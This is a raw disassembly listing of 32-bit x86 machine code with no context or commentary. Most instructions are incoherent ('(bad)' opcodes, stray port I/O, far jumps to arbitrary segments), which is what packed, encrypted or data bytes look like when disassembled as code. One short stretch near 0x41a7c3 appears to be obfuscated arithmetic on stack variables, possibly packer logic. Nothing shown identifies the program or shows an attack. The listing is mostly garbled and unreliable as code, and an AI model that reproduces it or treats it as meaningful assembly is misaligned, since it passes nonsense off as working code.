  41a363:	imul   DWORD PTR [eax+ebp*8+0x6506f3a]
  41a36a:	jp     0x41a399
  41a36c:	push   esi
  41a36d:	mov    al,ds:0x2820a57a
  41a372:	aaa    
  41a373:	nop
  41a374:	popa   
  41a375:	les    edi,FWORD PTR ds:0x7cde5d47
  41a37b:	je     0x41a3f3
  41a37d:	outs   dx,BYTE PTR ds:[esi]
  41a37e:	cli    
  41a37f:	add    al,0xb6
  41a381:	neg    DWORD PTR [ebx+0x49ff3063]
  41a387:	stos   BYTE PTR es:[edi],al
  41a388:	fwait
  41a389:	xor    DWORD PTR [edx],0x96c02afa
  41a38f:	add    eax,0x8f8f3ad6
  41a394:	ins    BYTE PTR es:[edi],dx
  41a395:	push   ss
  41a396:	jp     0x41a3e9
  41a398:	xor    ebp,ecx
  41a39a:	inc    ebx
  41a39b:	clc    
  41a39c:	scas   al,BYTE PTR es:[edi]
  41a39d:	sub    bh,BYTE PTR [eax+0x51e2e7c8]
  41a3a3:	bnd jmp 0x41a3dc
  41a3a6:	xor    eax,0x236275ec
  41a3ab:	out    0x79,eax
  41a3ad:	push   ebp
  41a3ae:	jbe    0x41a36e
  41a3b0:	push   edi
  41a3b1:	mov    ebx,0x7db9425c
  41a3b6:	rol    BYTE PTR [ecx-0x2bfb78a7],cl
  41a3bc:	add    eax,0x5d643501
  41a3c1:	pop    eax
  41a3c2:	out    dx,eax
  41a3c3:	mov    bl,0x2e
  41a3c5:	out    0xd1,eax
  41a3c7:	jbe    0x41a386
  41a3c9:	les    ebx,FWORD PTR [ecx-0x73]
  41a3cc:	std    
  41a3cd:	mov    ?,WORD PTR [esi]
  41a3cf:	mov    edx,0xe95eb05b
  41a3d4:	adc    bl,dh
  41a3d6:	inc    edi
  41a3d7:	idiv   DWORD PTR [esi+eiz*8-0x2e1827fd]
  41a3de:	ret    0x4e79
  41a3e1:	push   edi
  41a3e2:	lock or eax,0xaf616afe
  41a3e8:	jp     0x41a3dd
  41a3ea:	jl     0x41a37d
  41a3ec:	push   ss
  41a3ed:	in     eax,dx
  41a3ee:	adc    eax,0xd5af1c2c
  41a3f3:	ins    DWORD PTR es:[edi],dx
  41a3f4:	ror    DWORD PTR [edx],cl
  41a3f6:	scas   al,BYTE PTR es:[edi]
  41a3f7:	mov    eax,ds:0x5387f251
  41a3fc:	xchg   ebp,eax
  41a3fd:	pop    edi
  41a3fe:	push   ss
  41a3ff:	cwde   
  41a400:	mov    ah,0x74
  41a402:	mov    dl,0x6f
  41a404:	push   ebp
  41a405:	xlat   BYTE PTR ds:[ebx]
  41a406:	mov    es,esi
  41a408:	aaa    
  41a409:	xchg   ecx,eax
  41a40a:	les    eax,FWORD PTR [ebx]
  41a40c:	pop    ebx
  41a40d:	xlat   BYTE PTR ds:[ebx]
  41a40e:	fnstcw WORD PTR fs:[edx-0x415c734e]
  41a415:	mov    DWORD PTR [edx+eiz*4+0x56e75f86],edx
  41a41c:	mov    eax,ds:0x5336dec4
  41a421:	or     al,0xa9
  41a423:	dec    eax
  41a424:	push   edx
  41a425:	push   ss
  41a426:	sbb    cl,BYTE PTR [esi+0x6ca232e8]
  41a42c:	popf   
  41a42d:	jmp    0xa1bb:0x2036c2e7
  41a434:	je     0x41a3f4
  41a436:	xchg   BYTE PTR [ebx-0x3],dl
  41a439:	mov    cx,0xdb8a
  41a43d:	xchg   DWORD PTR [edi],edi
  41a43f:	or     DWORD PTR [edi],edx
  41a441:	mov    ebx,0xc8702ac4
  41a446:	pop    ecx
  41a447:	sbb    al,0xbd
  41a449:	mov    edi,0x9c6c4688
  41a44e:	pop    ebx
  41a44f:	jecxz  0x41a4d0
  41a451:	repz jb 0x41a437
  41a454:	repz jae 0x41a4c8
  41a457:	pop    edi
  41a458:	xchg   ax,ax
  41a45a:	out    dx,eax
  41a45b:	aaa    
  41a45c:	loop   0x41a4a8
  41a45e:	ficom  WORD PTR [ecx-0x1224d43e]
  41a464:	cmp    al,0x12
  41a466:	(bad)  
  41a467:	int3   
  41a468:	cli    
  41a469:	not    BYTE PTR [ebp-0x4b0aa569]
  41a46f:	idiv   dh
  41a471:	test   al,0x37
  41a473:	mov    cl,0xbd
  41a475:	addr16 push ss
  41a477:	sub    ebp,ebp
  41a479:	sub    ebx,DWORD PTR [ecx+ecx*1+0x76]
  41a47d:	loop   0x41a42b
  41a47f:	ds push ds
  41a481:	sub    al,0x14
  41a483:	ins    DWORD PTR es:[edi],dx
  41a484:	dec    edx
  41a485:	xchg   ebp,eax
  41a486:	push   ebx
  41a487:	sbb    ebx,DWORD PTR [esp+eiz*2+0x321d1369]
  41a48e:	pop    es
  41a48f:	std    
  41a490:	imul   esp,DWORD PTR [ebx-0x3d],0xffffffcb
  41a494:	xor    cl,BYTE PTR [ebx+0x5d]
  41a497:	js     0x41a4a6
  41a499:	inc    esi
  41a49a:	pop    ebp
  41a49b:	cmp    ecx,DWORD PTR [esi-0x71]
  41a49e:	mov    ds:0x330c743e,eax
  41a4a3:	mov    esi,0xf7ff40fa
  41a4a8:	and    eax,0x35af163
  41a4ad:	cmp    cl,cl
  41a4af:	into   
  41a4b0:	mov    edx,0xb34b0fa2
  41a4b5:	pop    esi
  41a4b6:	jmp    0x9d93:0xbfd69178
  41a4bd:	bound  edx,QWORD PTR [eax+0x7c]
  41a4c0:	jmp    0xc261:0xb55b92ab
  41a4c7:	inc    ebx
  41a4c8:	pop    esi
  41a4c9:	fadd   DWORD PTR [ecx-0x5c98adba]
  41a4cf:	(bad)  
  41a4d1:	xor    ebx,DWORD PTR [ecx-0x21]
  41a4d4:	push   0xfb4c3b13
  41a4d9:	mov    ecx,es
  41a4db:	inc    ebp
  41a4dc:	fwait
  41a4dd:	in     eax,dx
  41a4de:	arpl   WORD PTR [edx],si
  41a4e0:	and    BYTE PTR [ecx],ch
  41a4e2:	mov    al,0x33
  41a4e4:	cmp    dh,cl
  41a4e6:	pop    eax
  41a4e7:	xor    al,0x83
  41a4e9:	sub    ch,cl
  41a4eb:	or     dl,dh
  41a4ed:	mov    ds:0x984ae728,eax
  41a4f2:	jecxz  0x41a49b
  41a4f4:	jle    0x41a4df
  41a4f6:	sbb    eax,0x6de3cce5
  41a4fb:	ret    
  41a4fc:	jle    0x41a543
  41a4fe:	es push eax
  41a500:	or     eax,0x1ed952b3
  41a505:	mov    bl,0x55
  41a507:	push   ebx
  41a508:	inc    esi
  41a509:	je     0x41a557
  41a50b:	in     al,0x35
  41a50d:	mov    ecx,0x7a9ec33c
  41a512:	xchg   ebx,eax
  41a513:	retf   
  41a514:	jb     0x41a527
  41a516:	push   cs
  41a517:	xchg   ecx,eax
  41a518:	cmp    al,0xb5
  41a51a:	inc    eax
  41a51b:	push   cs
  41a51c:	test   ah,0x1f
  41a51f:	repz push ecx
  41a521:	xchg   esp,eax
  41a522:	loopne 0x41a514
  41a524:	sub    eax,0x300fde0b
  41a529:	gs lahf 
  41a52b:	or     DWORD PTR [edx],ecx
  41a52d:	jb     0x41a571
  41a52f:	rcl    dl,1
  41a531:	mov    edi,0x687ec969
  41a536:	mov    bl,0x86
  41a538:	jne    0x41a518
  41a53a:	mov    ecx,edi
  41a53c:	or     ch,BYTE PTR [esi+0x2e]
  41a53f:	jmp    0xf84d:0x44308de7
  41a546:	pop    ecx
  41a547:	pop    ebx
  41a548:	add    eax,0x584a4246
  41a54d:	lods   eax,DWORD PTR ds:[esi]
  41a54e:	xchg   esi,eax
  41a54f:	(bad)  
  41a551:	loopne 0x41a53e
  41a553:	aad    0xa9
  41a555:	xor    eax,0xecdbffcb
  41a55a:	sbb    al,bl
  41a55c:	fistp  QWORD PTR [esi]
  41a55e:	push   ds
  41a55f:	shl    ah,0xb1
  41a562:	mov    eax,0xdb147a52
  41a567:	scas   al,BYTE PTR es:[edi]
  41a568:	mov    ah,0xa6
  41a56a:	or     eax,0x4f8d43a1
  41a56f:	dec    eax
  41a570:	jge    0x41a553
  41a572:	xchg   ebp,eax
  41a573:	push   esp
  41a574:	adc    esp,DWORD PTR [ebx]
  41a576:	jmp    0x41a59f
  41a578:	out    dx,al
  41a579:	dec    ebx
  41a57a:	jns    0x41a5c0
  41a57c:	inc    esi
  41a57d:	mov    bl,0x17
  41a57f:	xchg   esp,eax
  41a580:	xor    al,0x4b
  41a582:	repz jg 0x41a595
  41a585:	data16 cmp cl,BYTE PTR [eax]
  41a588:	icebp  
  41a589:	sbb    edi,DWORD PTR [edx-0x31]
  41a58c:	ret    0x8458
  41a58f:	stos   BYTE PTR es:[edi],al
  41a590:	jg     0x41a571
  41a592:	retf   
  41a593:	imul   ecx,DWORD PTR [edi-0x7f],0x54
  41a597:	into   
  41a598:	xchg   edx,eax
  41a599:	adc    BYTE PTR [ecx-0x34],0x9a
  41a59d:	pop    edi
  41a59e:	test   BYTE PTR [ecx+0x7a],bl
  41a5a1:	jle    0x41a605
  41a5a3:	nop
  41a5a4:	jnp    0x41a5c1
  41a5a6:	(bad)  
  41a5a7:	lahf   
  41a5a8:	sbb    eax,0x78689514
  41a5ad:	in     eax,0x43
  41a5af:	or     edx,eax
  41a5b1:	xor    ch,BYTE PTR [ecx+0x5259f123]
  41a5b7:	dec    eax
  41a5b8:	cwde   
  41a5b9:	inc    ecx
  41a5ba:	ret    0xaa76
  41a5bd:	mov    cl,0x1d
  41a5bf:	aaa    
  41a5c0:	fisubr WORD PTR [ecx+ebx*4]
  41a5c3:	mov    ecx,0xdd377492
  41a5c8:	bound  esi,QWORD PTR [ebx+0x1a]
  41a5cb:	xor    ch,BYTE PTR [ebx-0x6a]
  41a5ce:	inc    ecx
  41a5cf:	xor    eax,0x4d0d54d7
  41a5d4:	retf   0xcb42
  41a5d7:	rol    edx,cl
  41a5d9:	vmptrst QWORD PTR [edi]
  41a5dc:	mov    eax,0xb46a96a0
  41a5e1:	push   eax
  41a5e2:	pop    ecx
  41a5e3:	pop    ds
  41a5e4:	pop    ss
  41a5e5:	dec    ebp
  41a5e6:	in     al,0xa8
  41a5e8:	cmp    al,0x81
  41a5ea:	ret    
  41a5eb:	test   DWORD PTR [ebp-0x6f],esp
  41a5ee:	bnd jmp 0x41a5e1
  41a5f1:	mov    ds:0x79b69a86,eax
  41a5f6:	add    al,0x38
  41a5f8:	pop    esp
  41a5f9:	add    BYTE PTR [esi],0x5e
  41a5fc:	jne    0x41a595
  41a5fe:	cmp    al,0x57
  41a600:	cmp    BYTE PTR [ebx+ecx*1-0x57],al
  41a604:	cmp    BYTE PTR [ecx+0x669bdbde],0xeb
  41a60b:	or     edx,DWORD PTR [eax-0x71]
  41a60e:	jle    0x41a615
  41a610:	mov    dl,0x50
  41a612:	in     al,dx
  41a613:	cli    
  41a614:	fstp   st(2)
  41a616:	mov    BYTE PTR [ecx-0x734d07aa],dh
  41a61c:	inc    ebx
  41a61d:	int    0x56
  41a61f:	pop    edi
  41a620:	shl    BYTE PTR [esi-0x4ef497cc],cl
  41a626:	add    bh,0x65
  41a629:	lea    ecx,gs:[ecx]
  41a62c:	sbb    DWORD PTR [edx+0x32724598],ebx
  41a632:	scas   al,BYTE PTR es:[edi]
  41a633:	xor    cl,BYTE PTR [eax-0x15]
  41a636:	out    dx,eax
  41a637:	dec    ecx
  41a638:	xor    ebp,0xffffffbf
  41a63b:	jnp    0x41a655
  41a63d:	pop    ebp
  41a63e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a63f:	sub    al,0x20
  41a641:	cmp    eax,0x4a4016e7
  41a646:	cmp    BYTE PTR [edx],bh
  41a648:	or     edx,DWORD PTR [ecx+0x6c1fe773]
  41a64e:	mov    ah,0x4f
  41a650:	push   cs
  41a651:	sbb    BYTE PTR [ecx],0x14
  41a654:	fistp  DWORD PTR [eax+ebx*8]
  41a657:	mov    DWORD PTR [edx],esp
  41a659:	dec    ebx
  41a65a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a65b:	jge    0x41a633
  41a65d:	je     0x41a643
  41a65f:	sbb    cl,dh
  41a661:	inc    eax
  41a662:	dec    edx
  41a663:	inc    ebp
  41a664:	adc    al,BYTE PTR [esi]
  41a666:	pushf  
  41a667:	iret   
  41a668:	jb     0x41a630
  41a66a:	mov    esp,0xf9142466
  41a66f:	cli    
  41a670:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a671:	ror    BYTE PTR [eax-0xf],1
  41a674:	out    0x4f,eax
  41a676:	cli    
  41a677:	fsub   st(0),st
  41a679:	repz ret 0xac91
  41a67d:	in     al,0xd
  41a67f:	dec    esi
  41a680:	std    
  41a681:	dec    edx
  41a682:	cmp    al,0xe
  41a684:	mov    esi,0x88ce8777
  41a689:	ins    DWORD PTR es:[edi],dx
  41a68a:	adc    BYTE PTR [ebx+0x4b],bh
  41a68d:	out    dx,eax
  41a68e:	and    DWORD PTR [eax],ecx
  41a690:	pop    esi
  41a691:	push   esi
  41a692:	adc    dl,BYTE PTR [ecx+0x3f]
  41a695:	pop    ebx
  41a696:	out    dx,eax
  41a697:	xlat   BYTE PTR ds:[ebx]
  41a698:	dec    ebx
  41a699:	lods   eax,DWORD PTR ds:[esi]
  41a69a:	pop    ss
  41a69b:	lods   eax,DWORD PTR ds:[esi]
  41a69c:	push   ss
  41a69d:	icebp  
  41a69e:	pop    eax
  41a69f:	xchg   ebp,eax
  41a6a0:	gs popa 
  41a6a2:	pop    esp
  41a6a3:	pop    ecx
  41a6a4:	dec    eax
  41a6a5:	xchg   esi,eax
  41a6a6:	mov    ebp,eax
  41a6a8:	sbb    eax,0xb3704e3b
  41a6ad:	lds    edi,FWORD PTR [edi]
  41a6af:	imul   esp,DWORD PTR [eax+0x31],0xa95836f5
  41a6b6:	xchg   edx,eax
  41a6b7:	sbb    BYTE PTR [esi+0x44],al
  41a6ba:	mov    ebp,0x9d9ab611
  41a6bf:	int    0x21
  41a6c1:	cmp    eax,0x5720560b
  41a6c6:	push   cs
  41a6c7:	and    al,0x70
  41a6c9:	les    edx,FWORD PTR [edx-0x195b1a95]
  41a6cf:	and    bh,BYTE PTR [ebp-0x5f]
  41a6d2:	xchg   edx,eax
  41a6d3:	inc    ebp
  41a6d4:	stc    
  41a6d5:	aaa    
  41a6d6:	cmc    
  41a6d7:	ja     0x41a6f3
  41a6d9:	inc    esi
  41a6da:	cmc    
  41a6db:	xchg   esi,eax
  41a6dc:	adc    ch,al
  41a6de:	pop    ss
  41a6df:	aam    0x3c
  41a6e1:	pushf  
  41a6e2:	ja     0x41a73a
  41a6e4:	push   es
  41a6e5:	retf   0x7437
  41a6e8:	imul   esp,DWORD PTR [edx-0x61],0x78
  41a6ec:	mov    cl,0x94
  41a6ee:	ret    
  41a6ef:	imul   edx,DWORD PTR [ecx],0xffffffd2
  41a6f2:	imul   eax,edi,0x7c
  41a6f5:	scas   al,BYTE PTR es:[edi]
  41a6f6:	dec    eax
  41a6f7:	xchg   DWORD PTR [edi+0x1e94f1c6],ecx
  41a6fd:	inc    esi
  41a6fe:	dec    edx
  41a6ff:	sbb    eax,0x1bfa3cc3
  41a704:	add    bh,BYTE PTR [ecx+0x16]
  41a707:	pusha  
  41a708:	push   eax
  41a709:	sbb    BYTE PTR [ebp+ebx*4+0x48300a48],ah
  41a710:	das    
  41a711:	call   0x803fda9d
  41a716:	sti    
  41a717:	push   edi
  41a718:	fisttp WORD PTR [edi+ebx*1+0x1c230f14]
  41a71f:	daa    
  41a720:	xor    BYTE PTR [ebx+esi*8-0x77a0c5c9],bh
  41a727:	jae    0x41a701
  41a729:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a72a:	fwait
  41a72b:	lahf   
  41a72c:	ret    
  41a72d:	pop    esp
  41a72e:	jne    0x41a770
  41a730:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a731:	in     eax,dx
  41a732:	scas   eax,DWORD PTR es:[edi]
  41a733:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a734:	push   edi
  41a735:	int3   
  41a736:	cmp    BYTE PTR [ebp-0x2c],bl
  41a739:	mov    ch,0xea
  41a73b:	fdiv   st(4),st
  41a73d:	fwait
  41a73e:	ret    0xbb66
  41a741:	ficomp WORD PTR [esi+0x11]
  41a744:	call   0x25a34f9f
  41a749:	cli    
  41a74a:	adc    dl,BYTE PTR [eax+0x5]
  41a74d:	arpl   WORD PTR [edi+0x77],ax
  41a750:	ds pop esp
  41a752:	dec    esp
  41a753:	test   al,0xfe
  41a755:	mov    edx,0xb5166228
  41a75a:	xchg   ebx,eax
  41a75b:	jb     0x41a719
  41a75d:	std    
  41a75e:	in     eax,0x2e
  41a760:	jmp    0x67905a17
  41a765:	sub    eax,0xe13639
  41a76a:	jge    0x41a72b
  41a76c:	add    edi,ebp
  41a76e:	(bad)  
  41a76f:	push   esi
  41a770:	dec    edi
  41a771:	and    bl,BYTE PTR [ecx-0x31]
  41a774:	jecxz  0x41a7bb
  41a776:	iret   
  41a777:	or     ecx,DWORD PTR [esi]
  41a779:	addr16 stc 
  41a77b:	adc    dl,BYTE PTR [ebx+0x41fc12e]
  41a781:	add    ecx,DWORD PTR [esi]
  41a783:	fmul   st,st(6)
  41a785:	mov    dl,0x47
  41a787:	xchg   ebx,eax
  41a788:	cmp    al,0x42
  41a78a:	aaa    
  41a78b:	mov    dl,bl
  41a78d:	xchg   edi,eax
  41a78e:	adc    bh,BYTE PTR [edi-0x378b9721]
  41a794:	xor    eax,0x9d42834d
  41a799:	pop    ebx
  41a79a:	xchg   edi,eax
  41a79b:	and    dh,BYTE PTR [eax+0x18]
  41a79e:	xchg   edi,eax
  41a79f:	mov    cl,0x38
  41a7a1:	pop    eax
  41a7a2:	sub    edx,DWORD PTR [eax]
  41a7a4:	xchg   esp,eax
  41a7a5:	push   cs
  41a7a6:	loopne 0x41a7f8
  41a7a8:	sub    al,0xe2
  41a7aa:	mov    dh,0x8f
  41a7ac:	leave  
  41a7ad:	ja     0x41a7b6
  41a7af:	jns    0x41a75d
  41a7b1:	ins    BYTE PTR es:[edi],dx
  41a7b2:	dec    eax
  41a7b3:	inc    edx
  41a7b4:	adc    bl,BYTE PTR [eax+0x653584b1]
  41a7ba:	js     0x41a76a
  41a7bc:	loopne 0x41a7c4
  41a7be:	test   al,0x3f
  41a7c0:	jo     0x41a7d0
  41a7c2:	aaa    
  41a7c3:	mov    edx,DWORD PTR [ebp-0x14]
  41a7c6:	mov    DWORD PTR [ebp+0x8],edx
  41a7c9:	jmp    0x41cb87
  41a7ce:	mov    edx,DWORD PTR [ebp+0x8]
  41a7d1:	mov    ebx,DWORD PTR [ebp-0x8]
  41a7d4:	xor    edx,eax
  41a7d6:	xor    ebx,eax
  41a7d8:	sub    edx,ebx
  41a7da:	sub    edx,esi
  41a7dc:	xor    edx,eax
  41a7de:	mov    DWORD PTR [ebp+0x8],edx
  41a7e1:	mov    edx,DWORD PTR [ebp+0x8]
  41a7e4:	mov    ebx,DWORD PTR [ebp-0x58]
  41a7e7:	add    edx,0x5708c4
  41a7ed:	imul   edx,ebx
  41a7f0:	mov    DWORD PTR [ebp-0x58],edx
  41a7f3:	mov    edx,DWORD PTR [ebp+0x8]
  41a7f6:	mov    ebx,DWORD PTR [ebp-0x54]
  41a7f9:	add    edx,0x64f8da
  41a7ff:	or     edx,ebx
  41a801:	mov    DWORD PTR [ebp-0x54],edx
  41a804:	mov    edx,DWORD PTR [ebp+0x8]
  41a807:	mov    ebx,DWORD PTR [ebp-0x50]
  41a80a:	add    edx,ecx
  41a80c:	xor    edx,ebx
  41a80e:	mov    DWORD PTR [ebp-0x50],edx
  41a811:	mov    edx,DWORD PTR [ebp+0x8]
  41a814:	mov    ebx,DWORD PTR [ebp-0x4c]
  41a817:	add    edx,edi
  41a819:	jmp    0x41cb62
  41a81e:	retf   
  41a81f:	lock xacquire sub DWORD PTR [ebx+0x2b],esi
  41a824:	mov    bl,0x72
  41a826:	cmp    bl,BYTE PTR [ebp+ebx*2-0x20c2cdd2]
  41a82d:	adc    BYTE PTR [eax+0x407c7d13],dl
  41a833:	pop    edi
  41a834:	jl     0x41a8b2
  41a836:	mov    esp,0xa8f986c8
  41a83b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a83c:	jle    0x41a864
  41a83e:	jp     0x41a87c
  41a840:	retf   
  41a841:	dec    ebp
  41a842:	mov    edi,0x468b3d55
  41a847:	mov    edx,0x350bb6e7
  41a84c:	fwait
  41a84d:	xchg   ebx,eax
  41a84e:	test   eax,0xcbcec6b
  41a853:	sti    
  41a854:	push   esi
  41a855:	mov    bl,0x79
  41a857:	sub    eax,0xc9f33162
  41a85c:	ret    
  41a85d:	dec    eax
  41a85e:	or     eax,0x5855a774
  41a863:	sti    
  41a864:	fcomp  DWORD PTR [edx-0x6d3f7c24]
  41a86a:	xchg   DWORD PTR [esi+ebp*8+0x4b4d13a5],edx
  41a871:	cmp    al,0x11
  41a873:	jns    0x41a8b5
  41a875:	iret   
  41a876:	push   es
  41a877:	js     0x498445ff
  41a87d:	cld    
  41a87e:	and    al,BYTE PTR [ebp+edx*1+0x78]
  41a882:	(bad)  
  41a883:	sar    BYTE PTR ds:0x89c14958,cl
  41a889:	dec    ecx
  41a88a:	pop    ds
  41a88b:	cwde   
  41a88c:	hlt    
  41a88d:	sub    eax,0x914ddb35
  41a892:	pop    ecx
  41a893:	fisub  DWORD PTR [ecx-0x4e]
  41a896:	jecxz  0x41a892
  41a898:	push   0xffffffac
  41a89a:	outs   dx,DWORD PTR ds:[esi]
  41a89b:	cmc    
  41a89c:	mov    al,ds:0x49dd9582
  41a8a1:	aad    0xa0
  41a8a3:	sub    edi,eax
  41a8a5:	gs mov es,edi
  41a8a8:	aam    0x6d
  41a8aa:	ins    DWORD PTR es:[edi],dx
  41a8ab:	sub    DWORD PTR [ebp-0x49dae63e],esp
  41a8b1:	scas   eax,DWORD PTR es:[edi]
  41a8b2:	aam    0xe1
  41a8b4:	sbb    eax,0x6612e515
  41a8b9:	out    dx,al
  41a8ba:	mov    edx,0x682fab33
  41a8bf:	xchg   ebp,eax
  41a8c0:	pop    DWORD PTR [ebx+0x1b]
  41a8c3:	sbb    al,0x51
  41a8c5:	ins    BYTE PTR es:[edi],dx
  41a8c6:	imul   ebx,DWORD PTR [eax],0x3d
  41a8c9:	xchg   BYTE PTR [ebx-0x4d101342],ah
  41a8cf:	dec    edx
  41a8d0:	int3   
  41a8d1:	xchg   esp,eax
  41a8d2:	cmp    al,0x7b
  41a8d4:	cmp    esp,ebp
  41a8d6:	add    eax,0x5bf45e61
  41a8db:	scas   eax,DWORD PTR es:[edi]
  41a8dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a8dd:	xchg   edi,eax
  41a8de:	sar    BYTE PTR [eax-0x369eb7a9],0xb5
  41a8e5:	or     ch,BYTE PTR ds:0x61b056e0
  41a8eb:	sub    cl,cl
  41a8ed:	das    
  41a8ee:	sar    BYTE PTR es:[ebp-0x36],0x2d
  41a8f3:	mov    bh,0x99
  41a8f5:	cdq    
  41a8f6:	scas   eax,DWORD PTR es:[edi]
  41a8f7:	dec    esi
  41a8f8:	sar    DWORD PTR [ebx+0x6c07ae7e],0xcb
  41a8ff:	sbb    esp,DWORD PTR [ebx+0x5c371e1d]
  41a905:	inc    edi
  41a906:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a907:	iret   
  41a908:	push   ebp
  41a909:	iret   
  41a90a:	daa    
  41a90b:	fidiv  DWORD PTR [edx+0x9]
  41a90e:	js     0x41a915
  41a910:	inc    edx
  41a911:	ins    BYTE PTR es:[edi],dx
  41a912:	push   ds
  41a913:	shr    BYTE PTR [edx-0x3e],cl
  41a916:	xor    BYTE PTR [ebp+0x50],cl
  41a919:	ss stc 
  41a91b:	jne    0x41a8a6
  41a91d:	and    ecx,DWORD PTR [edi-0x74e0836d]
  41a923:	popa   
  41a924:	add    ebp,DWORD PTR [eax]
  41a926:	dec    edi
  41a927:	jp     0x41a8ff
  41a929:	xchg   esp,eax
  41a92a:	je     0x41a8bb
  41a92c:	in     eax,dx
  41a92d:	loope  0x41a92d
  41a92f:	fimul  WORD PTR fs:[edi+ecx*8+0x670c9282]
  41a937:	pavgw  mm6,mm6
  41a93a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a93b:	xchg   edi,eax
  41a93c:	push   cs
  41a93d:	push   eax
  41a93e:	fiadd  DWORD PTR [ebx+eax*2]
  41a941:	clc    
  41a942:	scas   al,BYTE PTR es:[edi]
  41a943:	out    dx,eax
  41a944:	lahf   
  41a945:	and    al,0x7
  41a947:	out    0x38,al
  41a949:	aad    0x9f
  41a94b:	xchg   esi,eax
  41a94c:	and    DWORD PTR [eax+0x5c580e28],0x3d
  41a953:	xor    bh,BYTE PTR [edi-0x4e]
  41a956:	pop    ebp
  41a957:	imul   esi,ebx,0xffffffdf
  41a95a:	lds    ecx,FWORD PTR [edx+ebx*1+0x7c]
  41a95e:	add    DWORD PTR [eax+0x91eaa1a],ecx
  41a964:	inc    edi
  41a965:	jns    0x41a974
  41a967:	xlat   BYTE PTR ds:[ebx]
  41a968:	sti    
  41a969:	xchg   ebp,eax
  41a96a:	(bad)  
  41a96b:	fs jnp 0x41a919
  41a96e:	sub    cl,bl
  41a970:	lods   al,BYTE PTR ds:[esi]
  41a971:	cmp    BYTE PTR [edi+0x46acdcdc],bl
  41a977:	add    al,0x4b
  41a979:	mov    ebx,0xf1192ef0
  41a97e:	mov    al,BYTE PTR [ecx+0x3a]
  41a981:	test   BYTE PTR [ecx+edx*8-0x5188232f],0xe2
  41a989:	out    0x54,al
  41a98b:	ret    
  41a98c:	(bad)  
  41a98d:	mov    DWORD PTR [esi],ebx
  41a98f:	mov    DWORD PTR [edi+esi*1],ecx
  41a992:	mov    ch,0x6b
  41a994:	clc    
  41a995:	shr    DWORD PTR [ecx+0x20e6e5db],0xe6
  41a99c:	inc    edi
  41a99d:	idiv   dh
  41a99f:	neg    DWORD PTR cs:[eax+0x2a8fd5d9]
  41a9a6:	mov    ah,0xd4
  41a9a8:	inc    esi
  41a9a9:	push   edx
  41a9aa:	lods   eax,DWORD PTR ds:[esi]
  41a9ab:	sbb    eax,0xc963405f
  41a9b0:	push   edi
  41a9b1:	adc    BYTE PTR [esi-0x16],al
  41a9b4:	xchg   ebx,eax
  41a9b5:	(bad)  
  41a9b6:	in     al,dx
  41a9b7:	mov    dh,0x7a
  41a9b9:	out    0xeb,eax
  41a9bb:	mov    ds:0x307f3cfb,eax
  41a9c0:	pop    es
  41a9c1:	pop    edi
  41a9c2:	pop    ebx
  41a9c3:	icebp  
  41a9c4:	mov    fs,WORD PTR [edx-0x6c]
  41a9c7:	dec    ecx
  41a9c8:	mov    BYTE PTR [ebx+edx*4+0x15b95a9d],bh
  41a9cf:	push   es
  41a9d0:	xchg   DWORD PTR [edi+0x59],esi
  41a9d3:	dec    esp
  41a9d4:	pop    ecx
  41a9d5:	inc    edi
  41a9d6:	stc    
  41a9d7:	(bad)  
  41a9db:	popf   
  41a9dc:	and    DWORD PTR ds:0x9772c2da,esi
  41a9e2:	daa    
  41a9e3:	hlt    
  41a9e4:	or     esi,DWORD PTR [eax-0x34d2d87a]
  41a9ea:	and    DWORD PTR [ebx-0x20f35b49],ebp
  41a9f0:	xchg   edx,eax
  41a9f1:	lods   al,BYTE PTR ds:[esi]
  41a9f2:	fwait
  41a9f3:	call   0x2c0:0x643ccdbb
  41a9fa:	adc    eax,0x459063d0
  41a9ff:	inc    ebx
  41aa00:	jbe    0x41aa1b
  41aa02:	xchg   edx,eax
  41aa03:	inc    esp
  41aa04:	sub    ebx,ebp
  41aa06:	test   DWORD PTR [ebx],0xca13c7a4
  41aa0c:	push   edx
  41aa0d:	out    dx,eax
  41aa0e:	jbe    0x41aa0e
  41aa10:	inc    esp
  41aa11:	ins    DWORD PTR es:[edi],dx
  41aa12:	pop    edx
  41aa13:	outs   dx,DWORD PTR ds:[esi]
  41aa14:	hlt    
  41aa15:	shl    DWORD PTR [ebp-0x159b6a49],cl
  41aa1b:	dec    esi
  41aa1c:	mov    ch,0x3a
  41aa1e:	pop    edi
  41aa1f:	daa    
  41aa20:	dec    dx
  41aa22:	aad    0x91
  41aa24:	jno    0x41aa3a
  41aa26:	sub    DWORD PTR [eax-0x50a1c1b7],ecx
  41aa2c:	and    edi,edi
  41aa2e:	daa    
  41aa2f:	ficomp WORD PTR [ebx-0x4c]
  41aa32:	clc    
  41aa33:	lock or cl,BYTE PTR [ecx-0x16699abb]
  41aa3a:	outs   dx,BYTE PTR ds:[esi]
  41aa3b:	mov    bl,0xb0
  41aa3d:	cld    
  41aa3e:	test   al,0xfe
  41aa40:	adc    eax,0x3acda3c4
  41aa45:	pusha  
  41aa46:	and    al,0xa0
  41aa48:	jge    0x41aaba
  41aa4a:	pop    ecx
  41aa4b:	cmp    DWORD PTR [esp+edx*1-0x3d87d51c],edi
  41aa52:	and    BYTE PTR [edx],bl
  41aa54:	and    BYTE PTR [esi+0x27],dh
  41aa57:	jns    0x41a9e9
  41aa59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa5a:	cwde   
  41aa5b:	mov    esi,0x817654c7
  41aa60:	mov    edx,DWORD PTR [ebp+edx*1+0x1cc5fbc]
  41aa67:	stc    
  41aa68:	and    DWORD PTR [ebp-0x7d],edi
  41aa6b:	adc    ebx,DWORD PTR [eax+ebp*4-0x470e28fd]
  41aa72:	mov    al,ds:0xa7ac211d
  41aa77:	out    dx,al
  41aa78:	mov    edi,0x134fa98c
  41aa7e:	add    al,0x19
  41aa80:	rcr    BYTE PTR [edi],0xe5
  41aa83:	dec    esi
  41aa84:	xchg   BYTE PTR [edx-0x7925e468],cl
  41aa8a:	iret   
